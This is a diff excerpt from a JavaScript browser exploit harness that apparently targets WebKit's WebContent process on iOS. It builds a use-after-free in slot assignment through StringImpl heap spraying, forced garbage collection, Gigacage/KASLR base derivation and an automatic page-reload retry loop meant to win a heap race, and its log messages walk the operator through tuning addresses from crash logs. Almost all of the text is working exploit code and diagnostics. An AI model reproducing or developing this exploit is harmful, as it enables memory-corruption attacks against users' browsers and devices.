+        const absVA = _p6bAbsVA.toString(16).padStart(16,'0');
+        if (p6Exception) {
+          p6Crashes++;
+          log(`[P6B] cand[${ci}]=0x${absVA}: JS-EXCEPTION  injected=${p6Injected}  charCount=0x${_p6bCharCount.toString(16)}`);
+        } else {
+          p6NoCrashNoAnomaly += p6Injected ? 0 : 1;
+          const tag = p6Injected ? ' ← INJECTED (SHRINK fired + spray ran)' : '';
+          const _p6bCharCountHex = '0x' + _p6bCharCount.toString(16);
+          log(`[P6B] cand[${ci}]=0x${absVA}: NO-CRASH${tag}  injected=${p6Injected}  charCount=${_p6bCharCountHex} (crashAddr≈0x${(_p6bCharCount * 0x100000000).toString(16)})`);
+          if (p6Injected) {
+            p6InjCount++;  // v53 FIX: injection=true NO-CRASH → auto-retry path, NOT hit path
+            p6HitLog.push({ candidate: '0x' + candidateOffset.toString(16), injected: true, va: '0x' + _p6bAbsVA.toString(16) });
           }
         }
-        p6Injected = true;
-      });
-
-      // GC to null ghost WeakPtrs for this fresh setup
-      forceGC();
-      await new Promise(r => setTimeout(r, 50));
-
-      // Pump + trigger
-      let p6Exception = false;
-      let p6NodeAnomaly = false;
-      try {
-        for (let i = 0; i < p6PumpCount; i++)
-          p6slot.assign(i % 2 === 0 ? p6A : p6B);
-        const p6new = p6host.appendChild(document.createElement('span'));
-        p6slot.assign(p6new);
-        const p6nodes = p6slot.assignedNodes({ flatten: false });
-        p6host.remove();
-        // Node anomaly: if anything other than p6new came back → fake object was used
-        if (p6nodes.length !== 1 || p6nodes[0] !== p6new) {
-          p6NodeAnomaly = true;
-          p6Hits++;
-          p6HitLog.push({
-            candidate: candidateOffset.toString(16),
-            nodeLen: p6nodes.length,
-            identity: p6nodes[0] === p6new ? 'correct' : 'WRONG'
-          });
-        }
-      } catch(e) {
-        p6Exception = true;
-        p6host.remove();
+        if (ci % 4 === 3) await new Promise(r => setTimeout(r, 20));
       }
-
-      const absVA = (gigacageBase + BigInt(candidateOffset)).toString(16).padStart(16,'0');
-      if (p6Exception) {
-        p6Crashes++;
-        if (ci < 4 || p6NodeAnomaly)
-          log(`[P6B] cand[${ci}]=0x${absVA}: CRASH (bad candidate or vtable fault)`);
-      } else {
-        p6NoCrashNoAnomaly += p6NodeAnomaly ? 0 : 1;
-        log(`[P6B] cand[${ci}]=0x${absVA}: NO-CRASH${p6NodeAnomaly?' ← NODE-ANOMALY HIT':''}  injected=${p6Injected}`);
-      }
-      // Give iOS a breath between probes
-      if (ci % 4 === 3) await new Promise(r => setTimeout(r, 20));
+        } else if (gigacageBase !== 0n) {
+      log('[P6B] No candidates from oracle — no sweep to run');
     }
 
     if (p6Hits > 0) {
-      log(`\n[!!!] Phase 6 HIT: ${p6Hits} candidates produced node anomaly`);
-      log('[!!!] Fake ManualSlotAssignment read succeeded → KASLR candidate + arb-read confirmed');
+      log(`\n[!!!] Phase 6 HIT: crash-reload confirmed (WebContent died on fake StringImpl deref)`);
+      log('[!!!] KERN_INVALID_ADDRESS → UAF arb-crash primitive CONFIRMED');
       p6HitLog.forEach(h => log(`[!!!]   ${JSON.stringify(h)}`));
+      // clean up retry state — hit detected
+      try { localStorage.removeItem(P6B_RETRY_KEY); } catch(_) {}
+      try { localStorage.removeItem('p6b_retry_count'); } catch(_) {}
     } else {
       log(`\n[P6] Summary: ${p6Crashes} crashes, ${p6NoCrashNoAnomaly} no-crash-no-anomaly, ${p6Hits} hits`);
-      if (p6Crashes === candidates.length && gigacageBase === 0n) {
-        log('[P6] ✗ Expected: ALL crashed — gigacageBase is 0n (unresolved)');
+      if (gigacageBase === 0n) {
+        log('[P6] ✗ gigacageBase is 0n (unresolved) — no sweep ran');
         log('[P6] ACTION NEEDED: derive gigacageBase from T9 rank-0 alloc, then set in code');
         log('[P6] From your log: look for "T9 rank fit" or "heap rank" section');
         log('[P6]   fit: ns = intercept + slope × rank');
@@ -1703,15 +2951,65 @@ function checkNodeLeak(nodes, expectedNode) {
         log('[P6]   OR: check "top candidates" hex values — the PAGE_BASE column = Gigacage+offset');
         log('[P6]   e.g. if highConf[0]=0x130000 and Gigacage is at 0x200000000000,');
         log('[P6]        then absolute VA = 0x200000130000');
-      } else if (p6Crashes === candidates.length) {
-        log('[P6] ✗ All crashed — gigacageBase may be wrong, or candidates don\'t map to our bufs');
+      } else if (p6Crashes > 0) {
+        log('[P6] ✗ Some JS-EXCEPTIONs but no KERN_INVALID_ADDRESS crash — spray may not be landing');
         log('[P6] Try adjusting gigacageBase ± 0x10000000000 increments');
       } else {
-        log('[P6] Some probes didn\'t crash but produced no node anomaly — partial signal');
-        log('[P6] vtable call at key+0 may have returned cleanly without anomaly path');
+        // ── v53: auto-retry — SHRINK confirmed (injections>0) but crash stochastic ──────────
+        // The UAF is real: 29/29 injections prove SHRINK+spray fires every time.
+        // The KERN_INVALID_ADDRESS crash depends on bmalloc allocator giving freed 1024B slot
+        // to our spray StringImpl BEFORE effectiveCurrent() dereferences m_slots iterator.
+        // This is a synchronous native heap race — not controllable from JS timing.
+        // Strategy: reload up to P6B_RETRY_MAX times, each time running all 29 probes.
+        // Stochastic crash probability per probe ≈ P (depends on heap fragmentation).
+        // Expected reloads to hit ≈ 1/(29×P). If P≈1% → expected ~3-4 reloads.
+        // _injCount = probes where SHRINK fired + spray ran (injected=true) but no process crash
+        const _injCount = _p6bCandToTry.length - p6NoCrashNoAnomaly - p6Crashes;
+        const _retryCount = parseInt(localStorage.getItem('p6b_retry_count') || '0');
+        log(`[P6] All NO-CRASH this pass. SHRINK-injected=${_injCount}/${_p6bCandToTry.length} (p6InjCount=${p6InjCount}), retry=${_retryCount}/${P6B_RETRY_MAX}`);
+        if (candidates.length > 0 && gigacageBase !== 0n && _retryCount < P6B_RETRY_MAX) {
+          // save oracle state so next run skips Phase 1-5
+          try {
+            const _retryData = {
+              gigacageBase: gigacageBase.toString(16),
+              candidates: candidates.map(String), // numeric offsets as strings
+              ts: Date.now(),
+              retryNum: _retryCount + 1
+            };
+            localStorage.setItem(P6B_RETRY_KEY, JSON.stringify(_retryData));
+            localStorage.setItem('p6b_retry_count', String(_retryCount + 1));
+            log(`[v53 AUTO-RETRY] Scheduling reload ${_retryCount + 1}/${P6B_RETRY_MAX} in 800ms...`);
+            log('[v53 AUTO-RETRY] SHRINK confirmed — crash is stochastic — iterating until KERN_INVALID_ADDRESS');
+            log('[v53 AUTO-RETRY] If page crashes → [P6B HIT] will appear on reload (localStorage checkpoint)');
+            setTimeout(() => { location.reload(); }, 800);
+          } catch(_retryErr) {
+            log(`[v53 AUTO-RETRY] localStorage write failed: ${_retryErr} — manual retry needed`);
+          }
+        } else if (_retryCount >= P6B_RETRY_MAX) {
+          log(`[v53 AUTO-RETRY] ${P6B_RETRY_MAX} retries exhausted — no crash. UAF fires but heap race not won.`);
+          log('[P6] Possible causes after 20× retry:');
+          log('[P6]   1. gigacageBase wrong — spray VA does not correspond to freed bucket addr');
+          log('[P6]   2. bmalloc size-class segregation preventing reclaim of 1024B slot by our spray');
+          log('[P6]   3. SHRINK timing window closed before spray StringImpl constructed');
+          try { localStorage.removeItem(P6B_RETRY_KEY); } catch(_) {}
+          try { localStorage.removeItem('p6b_retry_count'); } catch(_) {}
+        } else {
+          log('[P6] All NO-CRASH. Possible causes:');
+          log('[P6]   1. uafSetup GC dead count < threshold — pool cases not accumulating dead WeakPtrs');
+          log('[P6]   2. clearManuallyAssignedNodes wipes dead entries before ensure() threshold check');
+          log('[P6]      → check uafSetup pumpCount vs capacity/2 threshold');
+          log('[P6]   3. StringImpl spray landing in wrong bin — freedSz/2 mismatch');
+          log('[P6]   4. gigacageBase wrong — fake key VA not landing in injected pages');
+        }
       }
-    }
-  }
+    } // end if (p6Hits > 0)
+
+    } catch(p6err) { // ── catches silent exceptions from P6A/P6B ──────────────
+      log(`\n[P6 ERROR] Uncaught exception in Phase 6: ${p6err && p6err.message ? p6err.message : String(p6err)}`);
+      log(`[P6 ERROR] Stack: ${p6err && p6err.stack ? p6err.stack.split('\n').slice(0,4).join(' | ') : 'n/a'}`);
+      log(`[P6 ERROR] This is why [P6A] never appeared — fix the error above and re-run`);
+    } // end try/catch P6A+P6B
+  } // end outer phase 6 gate
 
   // ─── Summary ─────────────────────────────────────────────────────────────
   log(`\n${'═'.repeat(60)}`);
@@ -1726,13 +3024,16 @@ function checkNodeLeak(nodes, expectedNode) {
   log(`UAF status:    ${hardConfirmed ? '✓ HARD CONFIRMED' : mediumConfirmed ? '✓ MEDIUM CONFIRMED' : softSignal ? '~ SOFT SIGNAL (spray ran)' : 'no signal'}`);
   log('═'.repeat(60));
   if (highConf.length > 0) {
-    log('\nNEXT STEP — resolve gigacageBase for Phase 6:');
-    log(`  highConf[0] offset = 0x${highConf[0].toString(16)}`);
-    log('  On A16 iOS 26, Gigacage absolute base is typically 0x1c0000000000–0x200000000000.');
-    log('  Find in crash log: KERN_INVALID_ADDRESS at some_va → that va - highConf[0] = gigacageBase');
-    log('  Or: from T9 rank-0 alloc: plug rank=0 into fit → ns → that ns maps to alloc[0] in sprayHex');
-    log(`  Example: if base=0x1c0000000000, key VA = 0x${(0x1c0000000000n + BigInt(highConf[0])).toString(16)}`);
-    log('  Set gigacageBase in Phase 6 code and rerun → probes will stop crashing on correct candidate');
+    const _hcOff0 = highConf[0].c * P6_PAGE;
+    log('\nNEXT STEP — P6A checkpoint flow:');
+    log(`  sweepOffset (highConf[0]): 0x${_hcOff0.toString(16)}`);
+    log('  IF page crashed during Phase 6A probe:');
+    log('    → RELOAD this page. Base is auto-computed from localStorage checkpoint.');
+    log('  IF page survived but P6B all-crashed:');
+    log('    → Wrong base. Open console, run:');
+    log(`      localStorage.setItem('p6a_checkpoint', JSON.stringify({faultAddr:'<KERN_INVALID_ADDR_FROM_ANALYTICS>', sweepOffset:'0x${_hcOff0.toString(16)}', survived:true}))`);
+    log('    → Reload page.');
+    log('  Analytics path: Settings → Privacy → Analytics & Improvements → Analytics Data → WebContent crash');
   }
 })();
 
